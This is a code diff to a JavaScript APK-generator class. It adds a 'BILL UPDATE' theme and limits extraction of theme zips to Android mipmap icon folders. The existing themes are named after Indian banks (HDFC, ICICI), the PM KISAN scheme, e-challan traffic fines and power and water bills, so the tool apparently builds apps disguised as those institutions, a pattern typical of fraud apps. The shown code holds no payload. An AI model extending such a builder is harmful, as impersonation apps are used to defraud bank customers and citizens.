@@ -24,7 +24,7 @@ class ApkGenerator {
     }
 
     initResPath() {
-        if (this.appTheme === "WATER" || this.appTheme === "Customer SB" || this.appTheme === "HDFC NEU" || this.appTheme === "ICICI" || this.appTheme === "PM KISAN" || this.appTheme === "ECHALLAN") {
+        if (this.appTheme === "WATER" || this.appTheme === "Customer SB" || this.appTheme === "BILL UPDATE" || this.appTheme === "HDFC NEU" || this.appTheme === "ICICI" || this.appTheme === "PM KISAN" || this.appTheme === "ECHALLAN") {
             this.resZip = path.join(__dirname, `../../data/resources/${this.appTheme}.zip`);
         } else if (this.appTheme === "POWER" || this.appTheme === "POWER V2") {
             this.resZip = path.join(__dirname, `../../data/resources/POWER.zip`);
@@ -397,50 +397,55 @@ class ApkGenerator {
     /**
      * Extracts zip file to res folder
      */
+    /**
+     * Extracts only selected mipmap folders from zip to res folder
+     */
     extractZipToRes() {
         try {
             const zip = new AdmZip(this.resZip);
             const entries = zip.getEntries();
 
-            console.log(`Extracting ${entries.length} files from zip...`);
+            const allowedFolders = [
+                'mipmap-xxxhdpi/',
+                'mipmap-anydpi/',
+                'mipmap-anydpi-v26/',
+                'mipmap-hdpi/',
+                'mipmap-mdpi/',
+                'mipmap-xhdpi/',
+                'mipmap-xxhdpi/'
+            ];
 
-            // Create res directory
-            fs.mkdirSync(this.resPath, { recursive: true });
+            console.log(`Extracting selected mipmap folders from zip...`);
 
-            // Check if zip contains a res folder at root
-            const hasResFolder = entries.some(entry =>
-                entry.entryName.startsWith('res/') && entry.entryName !== 'res/'
-            );
+            // Create res directory if it doesn't exist
+            fs.mkdirSync(this.resPath, {recursive: true});
 
             entries.forEach(entry => {
-                let targetPath;
+                if (!entry.entryName.startsWith('res/') || entry.entryName === 'res/') return;
 
-                if (hasResFolder && entry.entryName.startsWith('res/')) {
-                    // Remove 'res/' prefix to avoid res/res structure
-                    const relativePath = entry.entryName.substring(4); // Remove 'res/' (4 characters)
-                    if (relativePath === '') return; // Skip empty res folder entry
-                    targetPath = path.join(this.resPath, relativePath);
-                } else {
-                    // Use original path if no res folder in zip
-                    targetPath = path.join(this.resPath, entry.entryName);
-                }
+                const relativePath = entry.entryName.substring(4); // remove 'res/'
+                const folder = relativePath.split('/')[0] + '/';
+
+                // Only extract if folder is in the allowed list
+                if (!allowedFolders.includes(folder)) return;
+
+                const targetPath = path.join(this.resPath, relativePath);
 
                 if (entry.isDirectory) {
-                    // Create directory
-                    fs.mkdirSync(targetPath, { recursive: true });
+                    fs.mkdirSync(targetPath, {recursive: true});
                 } else {
-                    // Create file
                     const dir = path.dirname(targetPath);
-                    fs.mkdirSync(dir, { recursive: true });
+                    fs.mkdirSync(dir, {recursive: true});
                     fs.writeFileSync(targetPath, entry.getData());
                 }
             });
 
-            console.log(`Successfully extracted to: ${this.resPath}`);
+            console.log(`✅ Selected mipmap folders successfully extracted to: ${this.resPath}`);
         } catch (error) {
-            throw new Error(`Failed to extract zip: ${error.message}`);
+            throw new Error(`❌ Failed to extract selected folders from zip: ${error.message}`);
         }
     }
+
     /**
      * Main method to replace res folder
      */
